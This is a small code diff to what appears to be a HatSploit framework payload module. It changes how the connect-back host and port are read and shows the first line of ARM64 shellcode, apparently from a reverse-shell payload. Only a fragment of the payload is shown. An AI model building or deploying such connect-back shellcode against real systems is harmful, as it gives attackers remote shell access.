@@ -24,7 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
+        connback_host = self.handler['CBHOST']
+        connback_port = self.handler['CBPORT']
 
         return (
             b"\x40\x00\x80\xd2"       # mov x0, #0x2
